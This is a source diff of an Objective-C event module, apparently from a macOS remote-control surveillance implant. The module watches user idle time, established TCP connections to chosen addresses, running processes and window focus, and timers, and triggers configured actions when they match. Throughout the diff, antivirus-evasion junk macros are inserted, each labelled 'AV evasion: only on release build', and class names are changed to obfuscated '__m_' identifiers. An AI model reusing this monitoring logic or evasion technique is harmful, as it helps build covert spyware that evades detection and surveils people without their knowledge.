@@ -43,6 +43,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
 // That's really stupid, check param.h
 // MAXCOMLEN	16		/* max command name remembered */ 
@@ -50,12 +51,12 @@
 
 extern NSString *RCSMaxLogQuotaReached;
 
-static RCSMEvents *sharedEvents = nil;
+static __m_MEvents *sharedEvents = nil;
 static NSMutableArray *connectionsDetected = nil;
 NSLock *connectionLock;
 
 
-@implementation RCSMEvents
+@implementation __m_MEvents
 
 @synthesize mEventQuotaRunning;
 
@@ -63,7 +64,7 @@ NSLock *connectionLock;
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSMEvents *)sharedEvents
++ (__m_MEvents *)sharedEvents
 {
   @synchronized(self)
   {
@@ -81,7 +82,10 @@ NSLock *connectionLock;
 }
 
 + (id)allocWithZone: (NSZone *)aZone
-{
+{ 
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   @synchronized(self)
   {
     if (sharedEvents == nil)
@@ -149,15 +153,20 @@ NSLock *connectionLock;
 #pragma mark Events monitor routines
 #pragma mark -
 
-
 - (BOOL)isEventEnable: (NSDictionary*) configuration
 {
   BOOL enabled = TRUE;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   @synchronized(configuration)
   {
     enabled = [[configuration objectForKey:@"enabled"] intValue];
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   return enabled;
 }
@@ -167,8 +176,14 @@ NSLock *connectionLock;
   BOOL breaked = FALSE;
   int aDelay = [[configuration objectForKey:@"delay"] intValue];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if (aDelay > 0)
-    {
+  { 
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+    
       for (int i=0; i<aDelay; i++) 
         { 
           if ([configuration objectForKey: @"status"] == EVENT_STOP ||
@@ -184,7 +199,42 @@ NSLock *connectionLock;
   
   sleep(1);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   return breaked;
+}
+
+- (BOOL)tryTriggerRepeat:(int)anAction 
+               withDealy:(int)aDelay 
+            andIteration:(int)iter
+        andConfiguration:(NSDictionary*)configuration
+{
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
+  
+  if (anAction == 0xFFFFFFFF)
+    return FALSE;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
+  do 
+  {
+    if (iter > 0)
+      iter--;
+    
+    if ([self waitDelaySeconds:configuration] == FALSE && 
+        [self isEventEnable: configuration] == TRUE)
+      [taskManager triggerAction: anAction];
+    else
+      break;
+    
+  } while(iter == 0xFFFFFFFF || iter > 0);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
+  return TRUE;
 }
 
 - (void)tryTriggerRepeat:(int)anAction 
@@ -193,16 +243,25 @@ NSLock *connectionLock;
                  maxDate:(NSDate*)aDate
         andConfiguration:(NSDictionary*)configuration
 {
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   if (anAction == 0xFFFFFFFF)
     return;
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   do 
   {
     NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
     
     NSDate *now = [NSDate date];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_000
     
     if (iter > 0)
       iter--;
@@ -216,35 +275,217 @@ NSLock *connectionLock;
       
     [pool release];
     
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+    
   } while(iter == 0xFFFFFFFF || iter > 0);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   return;
 }
 
-- (BOOL)tryTriggerRepeat:(int)anAction 
-               withDealy:(int)aDelay 
-            andIteration:(int)iter
-        andConfiguration:(NSDictionary*)configuration
-{
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+- (UInt32)getIdleSec
+{ 
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
-  if (anAction == 0xFFFFFFFF)
-    return FALSE;
+  int64_t idlesecs = -1;
+  io_iterator_t iter = 0;
+  int64_t nanoseconds = 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
+  if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"), &iter) == KERN_SUCCESS) 
+  {
+    io_registry_entry_t entry = IOIteratorNext(iter);
     
-  do 
-    {
-      if (iter > 0)
-        iter--;
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+    
+    if (entry) 
+    { 
+      // AV evasion: only on release build
+      AV_GARBAGE_005
       
-      if ([self waitDelaySeconds:configuration] == FALSE && 
-          [self isEventEnable: configuration] == TRUE)
-        [taskManager triggerAction: anAction];
-      else
-        break;
-    
-    } while(iter == 0xFFFFFFFF || iter > 0);
+      CFMutableDictionaryRef dict = NULL;
+      if (IORegistryEntryCreateCFProperties(entry, &dict, kCFAllocatorDefault, 0) == KERN_SUCCESS) 
+      {
+        CFNumberRef obj = CFDictionaryGetValue(dict, CFSTR("HIDIdleTime"));
+        if (obj) 
+        {
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
+          if (CFNumberGetValue(obj, kCFNumberSInt64Type, &nanoseconds)) 
+            idlesecs = (nanoseconds >> 30); // Divide by 10^9 to convert from nanoseconds to seconds.
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
+        }
+        CFRelease(dict);
+      }
+      
+      IOObjectRelease(entry);
+    }
+    IOObjectRelease(iter);
+  }
+  
+#ifdef DEBUG_EVENTS
+  infoLog(@"%s: idle %lu sec", __FUNCTION__, idlesecs);
+#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
+  return idlesecs;
+}
 
-  return TRUE;
+- (BOOL)isInIdle:(UInt32) sec
+{ 
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  if ([self getIdleSec] > sec)
+    return TRUE;
+  else 
+    return FALSE;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
+}
+
+- (void)eventIdle:(NSDictionary*)configuration
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  BOOL amIInIdle = FALSE;
+  BOOL idleTriggered = FALSE;
+  [configuration retain];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  UInt32 *seconds = (UInt32*)[[configuration objectForKey: @"data"] bytes];
+  
+  int enterAction   = [[configuration objectForKey: @"actionID"] intValue];
+  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
+  int iter          = [[configuration objectForKey:@"iter"] intValue];
+  int end           = [[configuration objectForKey:@"end"] intValue];
+  
+  int currentIter   = iter;
+  
+#ifdef DEBUG_EVENTS
+  infoLog(@"%s: starting idle event every %lu sec", __FUNCTION__, *seconds);
+#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
+  while ([configuration objectForKey: @"status"] != EVENT_STOP
+         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+  {
+    amIInIdle = [self isInIdle: *seconds];
+    
+    if (amIInIdle == TRUE && idleTriggered == FALSE)
+    { 
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
+      if ([self isEventEnable: configuration] == TRUE)
+      {
+#ifdef DEBUG_EVENTS
+        infoLog(@"%s: triggering idle start %d", __FUNCTION__, enterAction);
+#endif
+        idleTriggered = TRUE; 
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_002
+        
+        [[__m_MTaskManager sharedInstance] triggerAction: enterAction];
+        currentIter = 0;
+      }
+    }
+    
+    if (amIInIdle == NO && idleTriggered == TRUE)
+    {
+      if ([self isEventEnable: configuration] == TRUE) 
+      { 
+        // AV evasion: only on release build
+        AV_GARBAGE_006
+        
+#ifdef DEBUG_EVENTS
+        infoLog(@"%s: triggering idle stop %d", __FUNCTION__, end);
+#endif
+        [[__m_MTaskManager sharedInstance] triggerAction: end];
+        idleTriggered = FALSE;
+      }
+    }
+    
+    if (amIInIdle == TRUE)
+    { 
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
+      if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
+          [self waitDelaySeconds:configuration] == FALSE &&
+          [self isEventEnable: configuration] == TRUE)
+      {
+#ifdef DEBUG_EVENTS
+        infoLog(@"%s: triggering idle repeat %d", __FUNCTION__, repeat);
+#endif
+        // AV evasion: only on release build
+        AV_GARBAGE_002
+        
+        [[__m_MTaskManager sharedInstance] triggerAction: repeat];
+        currentIter++;
+      }
+    }
+    
+    sleep(1);
+  }
+  
+  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
+  { 
+    // AV evasion: only on release build
+    AV_GARBAGE_001
+    
+    [configuration setValue: EVENT_STOPPED forKey: @"status"];
+  }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  [configuration release];
+  [outerPool release];
+  
+  return;
+}
+
+- (void)eventQuotaNotificationCallback:(NSNotification*)aNotify
+{
+  NSNumber *actionId = (NSNumber*)[aNotify object];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  if (actionId && [actionId intValue] > -1)
+  {
+#ifdef DEBUG_EVENTS
+    infoLog(@"event quota triggering action %@", actionId);
+#endif 
+    // AV evasion: only on release build
+    AV_GARBAGE_009
+    
+    [[__m_MTaskManager sharedInstance] triggerAction: [actionId intValue]];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+    
+  }
 }
 
 // Done.!
@@ -252,7 +493,10 @@ NSLock *connectionLock;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   NSDate *startThreadDate = [[NSDate date] retain];
   timerStruct *timerRawData;
   NSTimeInterval interval = 0;
@@ -273,6 +517,9 @@ NSLock *connectionLock;
   int iter          = [[configuration objectForKey:@"iter"] intValue];
   int curriteration = 0;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   while ([configuration objectForKey: @"status"] != EVENT_STOP &&
          [configuration objectForKey: @"status"] != EVENT_STOPPED)
     {
@@ -280,10 +527,13 @@ NSLock *connectionLock;
       
       switch (type)
         {
-          // never in rcs8
+          // never in __m_8
           case TIMER_AFTER_STARTUP:
             {
               interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_002
               
               if (fabs(interval) >= low / 1000)
                 {
@@ -307,7 +557,10 @@ NSLock *connectionLock;
               break;
             }
           case TIMER_LOOP:
-            {
+          { 
+            // AV evasion: only on release build
+            AV_GARBAGE_001
+            
               if ([self isEventEnable: configuration] == TRUE)
                 [taskManager triggerAction: actionID];
               
@@ -334,7 +587,10 @@ NSLock *connectionLock;
               break;
             }
           case TIMER_DATE:
-            {
+          { 
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
               int64_t configuredDate = 0;
               configuredDate = ((int64_t)high << 32) | (int64_t)low;
 
@@ -345,11 +601,17 @@ NSLock *connectionLock;
                 {
                   if ([self isEventEnable: configuration] == TRUE)
                     [taskManager triggerAction: actionID];
-                
+                  
+                  // AV evasion: only on release build
+                  AV_GARBAGE_004
+                  
                   [self tryTriggerRepeat: repeat 
                                withDealy: delay 
                             andIteration: iter 
                         andConfiguration: configuration];
+                  
+                  // AV evasion: only on release build
+                  AV_GARBAGE_005
                   
                   if ([self isEventEnable: configuration] == TRUE)
                     [taskManager triggerAction: endActionID];
@@ -364,7 +626,10 @@ NSLock *connectionLock;
               break;
             }
           case TIMER_INST:
-            {
+          { 
+            // AV evasion: only on release build
+            AV_GARBAGE_005
+            
               int64_t configuredDate = 0;
               // 100-nanosec unit from installation date
               configuredDate = ((int64_t)high << 32) | (int64_t)low;
@@ -379,13 +644,19 @@ NSLock *connectionLock;
           
               if (creationDate == nil)
                 break;
-              
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_008
+            
               NSDate *givenDate = [creationDate addTimeInterval: configuredDate];
             
               if ([[NSDate date] isGreaterThan: givenDate])
               {
                 if ([self isEventEnable: configuration] == TRUE)
                   [taskManager triggerAction: actionID];
+                
+                // AV evasion: only on release build
+                AV_GARBAGE_009
                 
                 [self tryTriggerRepeat: repeat 
                              withDealy: delay 
@@ -409,6 +680,9 @@ NSLock *connectionLock;
               //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
               NSDate *now = [NSDate date];
               
+              // AV evasion: only on release build
+              AV_GARBAGE_008
+              
               NSRange fixedRange;
               fixedRange.location = 11;
               fixedRange.length   = 8;
@@ -424,8 +698,14 @@ NSLock *connectionLock;
               NSString *currDateStr = [inFormat stringFromDate: now];
               [inFormat release];
               
+              // AV evasion: only on release build
+              AV_GARBAGE_006
+              
               NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
-        
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_007
+              
               // Set current date time to midnight
               [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];
 
@@ -436,11 +716,17 @@ NSLock *connectionLock;
               // Current midnite
               NSDate *dayDate = [outFormat dateFromString: dayStr];
               [outFormat release];
-   
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_003
+              
               [dayStr release];
               
               NSDate *lowDay  = [dayDate addTimeInterval: (low/1000)];  
               NSDate *highDay = [dayDate addTimeInterval: (high/1000)];        
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_002
               
               if (timerDailyTriggered == NO &&
                   [[now laterDate: lowDay] isEqualToDate: now] &&
@@ -449,18 +735,27 @@ NSLock *connectionLock;
                   if ([self isEventEnable: configuration] == TRUE)
                     [taskManager triggerAction: actionID];
                   
+                  // AV evasion: only on release build
+                  AV_GARBAGE_001
+                  
                   [self tryTriggerRepeat: repeat 
                                withDealy: delay 
                             andIteration: iter 
                                  maxDate: highDay
                         andConfiguration: configuration];
                   
+                  // AV evasion: only on release build
+                  AV_GARBAGE_003
+                  
                   timerDailyTriggered = YES;
                 } 
               else if (timerDailyTriggered == YES && 
                        ([[now laterDate: highDay] isEqualToDate: now] ||
                         [[now earlierDate: lowDay] isEqualToDate: now]) )
-                {
+              { 
+                // AV evasion: only on release build
+                AV_GARBAGE_000
+                
                   if ([self isEventEnable: configuration] == TRUE)
                     [taskManager triggerAction: endActionID];
                   timerDailyTriggered = NO;
@@ -479,11 +774,17 @@ NSLock *connectionLock;
       
       usleep(300000);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       [innerPool release];
     }
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
-    {
+  { 
+    // AV evasion: only on release build
+    AV_GARBAGE_000
+    
       [configuration setValue: EVENT_STOPPED
                        forKey: @"status"];
     }
@@ -493,6 +794,271 @@ NSLock *connectionLock;
   if (startThreadDate != nil)
     [startThreadDate release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  [outerPool release];
+}
+
+
+// Done.!
+- (void)eventConnection: (NSDictionary *)configuration
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
+  char mibName[] = "net.inet.tcp.pcblist";
+  connectionStruct *connectionRawData;
+  BOOL connectionFound;
+  struct xinpgen *xig, *oxig;
+  struct tcpcb *tp = NULL;
+  struct inpcb *inp;
+  struct xsocket *so;
+  size_t len = 0;
+  char *buffer;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  [configuration retain];
+  
+  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
+  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
+  int delay         = [[configuration objectForKey:@"delay"] intValue];
+  int iter          = [[configuration objectForKey:@"iter"] intValue];
+  int end           = [[configuration objectForKey:@"end"] intValue];
+  
+  while ([configuration objectForKey: @"status"]    != EVENT_STOP
+         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+  {
+    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+    connectionFound = FALSE;
+    
+    connectionRawData = (connectionStruct *)[[configuration objectForKey: @"data"] bytes];
+    
+    u_long ipAddress   = connectionRawData->ipAddress;
+    u_long netMask     = connectionRawData->netMask;
+    int connectionPort = connectionRawData->port;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_009
+    
+    struct in_addr tempAddress;
+    tempAddress.s_addr = ipAddress;
+    
+#ifdef DEBUG_EVENTS
+    verboseLog(@"IP Address to Match: %s", inet_ntoa(tempAddress));
+#endif
+    
+    if (sysctlbyname(mibName, 0, &len, 0, 0) >= 0)
+    {
+      if ((buffer = malloc(len)) != 0)
+      {
+        if (sysctlbyname(mibName, buffer, &len, 0, 0) < 0)
+        {
+#ifdef DEBUG_EVENTS
+          errorLog(@"Error on second sysctlbyname call");
+#endif
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+          
+          free(buffer);
+          [configuration release];
+          [innerPool release];
+          [outerPool release];
+          [NSThread exit];
+        }
+      }
+      else
+      {
+#ifdef DEBUG_EVENTS
+        errorLog(@"Error on malloc");
+#endif
+        free(buffer);
+        [configuration release];
+        [innerPool release];
+        [outerPool release];
+        [NSThread exit];
+      }
+    }
+    else
+    {
+#ifdef DEBUG_EVENTS
+      errorLog(@"Error on first sysctlbyname call");
+#endif
+      
+      free(buffer);
+      [configuration release];
+      [innerPool release];
+      [outerPool release];
+      [NSThread exit];
+    }
+    
+    oxig = xig = (struct xinpgen *)buffer;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_007
+    
+    struct in_addr netMaskStruct;
+    netMaskStruct.s_addr = netMask;
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+    
+    NSString *ip        = [NSString stringWithUTF8String: inet_ntoa(tempAddress)];
+    NSNumber *port      = [NSNumber numberWithInt: connectionPort];
+    NSString *ipNetmask = [NSString stringWithUTF8String: inet_ntoa(netMaskStruct)];
+    
+    //
+    // Cycle through all the TCP connections
+    //
+    for (xig = (struct xinpgen *)((char *)xig + xig->xig_len);
+         xig->xig_len > sizeof(struct xinpgen);
+         xig = (struct xinpgen *)((char *)xig + xig->xig_len))
+    {
+      tp  = &((struct xtcpcb *)xig)->xt_tp;
+      inp = &((struct xtcpcb *)xig)->xt_inp;
+      so  = &((struct xtcpcb *)xig)->xt_socket;
+      
+      //
+      // Check only for TCP and ESTABLISHED connections
+      //
+      extern char *tcpstates[];
+      const char *state = "ESTABLISHED";
+      
+      if (so->xso_protocol == IPPROTO_TCP && strncmp(tcpstates[tp->t_state],
+                                                     state,
+                                                     strlen(state)) == 0)
+      {
+#ifdef DEBUG_EVENTS
+        verboseLog(@"Found an established connection: %s", inet_ntoa(inp->inp_faddr));
+        verboseLog(@"Configured netmask: %@", ipNetmask);
+#endif
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_005
+        
+        //
+        // Check if the ip belongs to any local network
+        // and if it's the ip that we are looking for
+        //
+        if (isAddressOnLan(inp->inp_faddr) == FALSE
+            && compareIpAddress(inp->inp_faddr, tempAddress, netMask) == TRUE)
+        {
+#ifdef DEBUG_EVENTS
+          warnLog(@"Address in list: %s (not on lan)", inet_ntoa(inp->inp_faddr));
+#endif
+          
+          if (connectionPort == 0 || inp->inp_fport == connectionPort)
+          {
+            connectionFound = TRUE;
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_004
+            
+            //
+            // Check if the address hasn't been detected already
+            //
+            if (isAddressAlreadyDetected(ip,
+                                         connectionPort,
+                                         ipNetmask,
+                                         connectionsDetected) == FALSE)
+            { 
+              NSArray *keys = [[NSArray alloc] initWithObjects: @"ip", @"port", @"netmask", nil];
+              NSArray *objects = [[NSArray alloc] initWithObjects: ip, port, ipNetmask, nil];
+              
+              NSDictionary *connection = [[NSDictionary alloc] initWithObjects: objects
+                                                                       forKeys: keys];
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_003
+              
+              [connectionLock lock];
+              [connectionsDetected addObject: connection];
+              [connectionLock unlock];
+              
+              [keys release];
+              [objects release];
+              [connection release];
+              
+#ifdef DEBUG_EVENTS
+              warnLog(@"Event Connection triggered!");
+#endif
+              if ([self isEventEnable: configuration] == TRUE)
+                [taskManager triggerAction: actionID];
+              
+              [self tryTriggerRepeat: repeat 
+                           withDealy: delay 
+                        andIteration: iter 
+                    andConfiguration: configuration];
+              
+              if ([self isEventEnable: configuration] == TRUE)
+                [taskManager triggerAction: end];
+              
+            }
+          }
+        }
+      }
+    }
+    
+    free(buffer);
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
+    if (isAddressAlreadyDetected(ip,
+                                 connectionPort,
+                                 ipNetmask,
+                                 connectionsDetected) == TRUE
+        && connectionFound                            == FALSE)
+    {
+#ifdef DEBUG_EVENTS
+      infoLog(@"Removing Connection");
+#endif
+      //
+      // Connection has been found previously and now it's not there anymore
+      // thus we remove it from our array in order to let it trigger again
+      //
+      NSArray *keys = [[NSArray alloc] initWithObjects: @"ip", @"port", @"netmask", nil];
+      NSArray *objects = [[NSArray alloc] initWithObjects: ip, port, ipNetmask, nil];
+      
+      NSDictionary *connection = [[NSDictionary alloc] initWithObjects: objects
+                                                               forKeys: keys];
+      [connectionLock lock];
+      [connectionsDetected removeObject: connection];
+      [connectionLock unlock];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
+      [keys release];
+      [objects release];
+      [connection release];
+    }
+    
+    [innerPool release];
+    usleep(500000);
+  }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
+  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
+  { 
+    // AV evasion: only on release build
+    AV_GARBAGE_000
+    
+    [configuration setValue: EVENT_STOPPED forKey: @"status"];
+    
+    [connectionsDetected removeAllObjects];
+  }
+  
+  [configuration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [outerPool release];
 }
 
@@ -501,14 +1067,20 @@ NSLock *connectionLock;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
   NSString *process = nil;
   int processAlreadyFound = 0;
   processStruct *processRawData;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [configuration retain];
   
   processRawData = (processStruct *)[[configuration objectForKey: @"data"] bytes];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   int actionID      = [[configuration objectForKey: @"actionID"] intValue];
   int onTermination = processRawData->onClose;
@@ -533,7 +1105,10 @@ NSLock *connectionLock;
     
   NSString *process_lowercaseString = [process lowercaseString];
 
-                                                                                  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   BOOL onFocus  = NO;
   uint32_t mode = EVENT_PROCESS_NAME;
   
@@ -550,7 +1125,10 @@ NSLock *connectionLock;
       switch (mode)
         {
         case EVENT_PROCESS_NAME:
-          {
+          { 
+            // AV evasion: only on release build
+            AV_GARBAGE_007
+            
             if (processAlreadyFound != 0
                 && findProcessWithName(process_lowercaseString) == YES
                 && onFocus == YES)
@@ -562,6 +1140,9 @@ NSLock *connectionLock;
                 CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
                                                                    kCGNullWindowID);
                 int firstPid = -1;
+                
+                // AV evasion: only on release build
+                AV_GARBAGE_006
                 
                 for (NSMutableDictionary *entry in (NSArray *)windowList)
                   {
@@ -607,6 +1188,10 @@ NSLock *connectionLock;
                 // can clear the process found flag in order to trigger once again
                 // the event in case the process is launched multiple times
                 //
+                
+                // AV evasion: only on release build
+                AV_GARBAGE_005
+                
                 processAlreadyFound = 0;
                 
                 if (onTermination != 0xFFFFFFFF &&
@@ -621,7 +1206,10 @@ NSLock *connectionLock;
                 // we're currently looking for
                 //
                 if (onFocus == YES)
-                  {
+                { 
+                  // AV evasion: only on release build
+                  AV_GARBAGE_004
+                  
                     NSDictionary *windowInfo = getActiveWindowInfo();
                     NSString *procWithFocus  = [windowInfo objectForKey: @"processName"];
                     
@@ -666,6 +1254,9 @@ NSLock *connectionLock;
           {
             BOOL titleFound = NO;
             
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
             //
             // First see if the given entry has focus or is found inside the
             // current window list
@@ -685,12 +1276,19 @@ NSLock *connectionLock;
                     warnLog(@"Window (%@) got focus", process);
 #endif
                     titleFound = YES;
+                    
+                    // AV evasion: only on release build
+                    AV_GARBAGE_003
+                    
                   }
               }
             else
               {
                 CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
                                                                    kCGNullWindowID);
+                
+                // AV evasion: only on release build
+                AV_GARBAGE_002
                 
                 for (NSMutableDictionary *entry in (NSArray *)windowList)
                   {
@@ -716,6 +1314,9 @@ NSLock *connectionLock;
               {
                 processAlreadyFound = 1;
                 
+                // AV evasion: only on release build
+                AV_GARBAGE_001
+                
                 if (actionID != 0xFFFFFFFF &&
                     [self isEventEnable: configuration] == TRUE)
                   [taskManager triggerAction: actionID];
@@ -735,6 +1336,9 @@ NSLock *connectionLock;
                     CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
                                                                        kCGNullWindowID);
                     int firstPid = -1;
+                    
+                    // AV evasion: only on release build
+                    AV_GARBAGE_000
                     
                     for (NSMutableDictionary *entry in (NSArray *)windowList)
                       {
@@ -761,6 +1365,9 @@ NSLock *connectionLock;
                                   {
                                     processAlreadyFound = 0;
                                     
+                                    // AV evasion: only on release build
+                                    AV_GARBAGE_001
+                                    
                                     if (onTermination != 0xFFFFFFFF &&
                                         [self isEventEnable: configuration] == TRUE)
                                       [taskManager triggerAction: onTermination];
@@ -775,7 +1382,10 @@ NSLock *connectionLock;
             else if (processAlreadyFound != 0 && titleFound == NO)
               {
                 processAlreadyFound = 0;
-              
+                
+                // AV evasion: only on release build
+                AV_GARBAGE_002
+                
                 if (onTermination != 0xFFFFFFFF &&
                     [self isEventEnable: configuration] == TRUE)
                     [taskManager triggerAction: onTermination];
@@ -791,7 +1401,10 @@ NSLock *connectionLock;
        {
           if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
               [self waitDelaySeconds:configuration] == FALSE)
-            {
+          { 
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
               if ([self isEventEnable: configuration] == TRUE)
                 [taskManager triggerAction: repeat];
               currentIter++;
@@ -804,7 +1417,10 @@ NSLock *connectionLock;
     }
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
-    {
+  { 
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
       [configuration setValue: EVENT_STOPPED
                        forKey: @"status"];
     }
@@ -812,229 +1428,10 @@ NSLock *connectionLock;
   [process release];
   [configuration release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [outerPool drain];
-}
-
-// Done.!
-- (void)eventConnection: (NSDictionary *)configuration
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
-  char mibName[] = "net.inet.tcp.pcblist";
-  connectionStruct *connectionRawData;
-  BOOL connectionFound;
-  struct xinpgen *xig, *oxig;
-  struct tcpcb *tp = NULL;
-  struct inpcb *inp;
-  struct xsocket *so;
-  size_t len = 0;
-  char *buffer;
-
-  [configuration retain];
-
-  int actionID      = [[configuration objectForKey: @"actionID"] intValue];
-  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
-  int delay         = [[configuration objectForKey:@"delay"] intValue];
-  int iter          = [[configuration objectForKey:@"iter"] intValue];
-  int end           = [[configuration objectForKey:@"end"] intValue];
-  
-  while ([configuration objectForKey: @"status"]    != EVENT_STOP
-         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
-    {
-      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      connectionFound = FALSE;
-      
-      connectionRawData = (connectionStruct *)[[configuration objectForKey: @"data"] bytes];
-      
-      u_long ipAddress   = connectionRawData->ipAddress;
-      u_long netMask     = connectionRawData->netMask;
-      int connectionPort = connectionRawData->port;
- 
-      struct in_addr tempAddress;
-      tempAddress.s_addr = ipAddress;
-
-#ifdef DEBUG_EVENTS
-      verboseLog(@"IP Address to Match: %s", inet_ntoa(tempAddress));
-#endif
-
-      if (sysctlbyname(mibName, 0, &len, 0, 0) >= 0)
-        {
-          if ((buffer = malloc(len)) != 0)
-            {
-              if (sysctlbyname(mibName, buffer, &len, 0, 0) < 0)
-                {
-#ifdef DEBUG_EVENTS
-                  errorLog(@"Error on second sysctlbyname call");
-#endif
-                  
-                  free(buffer);
-                  [configuration release];
-                  [innerPool release];
-                  [outerPool release];
-                  [NSThread exit];
-                }
-            }
-          else
-            {
-#ifdef DEBUG_EVENTS
-              errorLog(@"Error on malloc");
-#endif
-              free(buffer);
-              [configuration release];
-              [innerPool release];
-              [outerPool release];
-              [NSThread exit];
-            }
-        }
-      else
-        {
-#ifdef DEBUG_EVENTS
-          errorLog(@"Error on first sysctlbyname call");
-#endif
-          
-          free(buffer);
-          [configuration release];
-          [innerPool release];
-          [outerPool release];
-          [NSThread exit];
-        }
-      
-      oxig = xig = (struct xinpgen *)buffer;
-      
-      struct in_addr netMaskStruct;
-      netMaskStruct.s_addr = netMask;
-      
-      NSString *ip        = [NSString stringWithUTF8String: inet_ntoa(tempAddress)];
-      NSNumber *port      = [NSNumber numberWithInt: connectionPort];
